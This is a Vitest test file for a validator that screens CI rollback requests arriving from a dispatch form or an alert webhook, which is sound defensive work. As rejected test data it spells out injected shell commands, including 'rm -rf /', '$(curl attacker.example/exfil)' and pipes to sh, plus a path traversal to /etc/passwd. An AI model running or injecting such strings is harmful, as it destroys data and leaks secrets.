/**
 * Rollback request validator contract.
 *
 * The security property under test: a rollback request built from free text
 * that arrives through a workflow_dispatch form or an external alert webhook
 * can never carry a shell metacharacter into the job that holds the Cloudflare
 * API token, and can never retarget the rollback at a different Worker or
 * environment.
 */
import { describe, it, expect } from 'vitest'
import {
  validateRollbackRequest,
  MAX_ALERT_ID_LENGTH,
  MAX_REASON_LENGTH,
  ROLLBACK_ENVIRONMENT,
  ROLLBACK_TARGET,
} from '../validate-rollback-request.mjs'

function request(overrides: Record<string, unknown> = {}) {
  return {
    reason: 'BS alert error rate above threshold',
    alertId: 'bs-200451',
    target: ROLLBACK_TARGET,
    environment: ROLLBACK_ENVIRONMENT,
    dryRun: 'false',
    ...overrides,
  }
}

describe('validate-rollback-request', () => {
  describe('accepted requests', () => {
    it('accepts an ordinary alert-triggered rollback request', () => {
      const decision = validateRollbackRequest(request())
      expect(decision.ok).toBe(true)
      expect(decision.decision).toBe('AUTHORIZED')
      expect(decision.sanitized.reason).toBe('BS alert error rate above threshold')
    })

    it('treats an absent reason as the manual default instead of failing', () => {
      const decision = validateRollbackRequest(request({ reason: '' }))
      expect(decision.ok).toBe(true)
      expect(decision.sanitized.reason).toBe('manual')
    })

    it('still accepts a reason carrying the punctuation a real alert message uses', () => {
      const decision = validateRollbackRequest(
        request({ reason: 'error_rate 1.2%/5min on canary route /api/health - see #2611' })
      )
      expect(decision.ok).toBe(true)
    })

    it('rejects a reason carrying parentheses even though an alert message plausibly would', () => {
      const decision = validateRollbackRequest(
        request({ reason: 'error_rate 1.2%/5min on canary (route /api/health)' })
      )
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_REASON_UNSAFE_CHARACTERS')
    })

    it('accepts a dry run and reports it as a distinct decision', () => {
      const decision = validateRollbackRequest(request({ dryRun: 'true' }))
      expect(decision.ok).toBe(true)
      expect(decision.decision).toBe('DRY_RUN_ONLY')
    })

    it('rejects a request that states no target rather than defaulting to production', () => {
      const decision = validateRollbackRequest({ reason: 'manual' })
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_TARGET_MISSING')
    })

    it('rejects a request that states no environment rather than defaulting to production', () => {
      const decision = validateRollbackRequest({ reason: 'manual', target: ROLLBACK_TARGET })
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_ENVIRONMENT_MISSING')
    })
  })

  describe('shell metacharacters in free text are rejected', () => {
    for (const payload of [
      'clean; rm -rf /',
      'clean && curl attacker.example',
      'clean | sh',
      '$(curl attacker.example/exfil)',
      '`whoami`',
      'reason with "double quotes"',
      "reason with 'single quotes'",
      'reason with \\backslash',
      'reason with $HOME expansion',
      'reason\nsecond line',
      'reason\rcarriage return',
      'reason with <redirection>',
      'reason with (substitution)',
    ]) {
      it(`rejects ${JSON.stringify(payload)}`, () => {
        const decision = validateRollbackRequest(request({ reason: payload }))
        expect(decision.ok).toBe(false)
        expect(decision.decision).toBe('REJECTED_REASON_UNSAFE_CHARACTERS')
      })
    }

    it('rejects an alert id carrying shell metacharacters', () => {
      const decision = validateRollbackRequest(request({ alertId: 'bs-1; curl attacker.example' }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_ALERT_ID_UNSAFE_CHARACTERS')
    })

    it('rejects an alert id carrying a path traversal segment', () => {
      const decision = validateRollbackRequest(request({ alertId: '../../../etc/passwd' }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_ALERT_ID_UNSAFE_CHARACTERS')
    })
  })

  describe('length bounds', () => {
    it('rejects a reason one character past the maximum', () => {
      const decision = validateRollbackRequest(request({ reason: 'a'.repeat(MAX_REASON_LENGTH + 1) }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_REASON_TOO_LONG')
    })

    it('accepts a reason exactly at the maximum', () => {
      const decision = validateRollbackRequest(request({ reason: 'a'.repeat(MAX_REASON_LENGTH) }))
      expect(decision.ok).toBe(true)
    })

    it('rejects an over-long alert id', () => {
      const decision = validateRollbackRequest(request({ alertId: 'a'.repeat(MAX_ALERT_ID_LENGTH + 1) }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_ALERT_ID_TOO_LONG')
    })
  })

  describe('target and environment cannot be retargeted', () => {
    it('rejects a rollback aimed at a foreign Worker', () => {
      const decision = validateRollbackRequest(request({ target: 'someone-elses-worker' }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_TARGET_MISMATCH')
    })

    it('rejects a rollback aimed at staging', () => {
      const decision = validateRollbackRequest(request({ environment: 'staging' }))
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_ENVIRONMENT_MISMATCH')
    })

    it('rejects an empty target rather than silently substituting one', () => {
      const decision = validateRollbackRequest({ ...request(), target: '' })
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_TARGET_MISSING')
    })

    it('rejects a whitespace-only target instead of trimming it into validity', () => {
      const decision = validateRollbackRequest({ ...request(), target: '   ' })
      expect(decision.ok).toBe(false)
      expect(decision.decision).toBe('REJECTED_TARGET_MISSING')
    })
  })
})
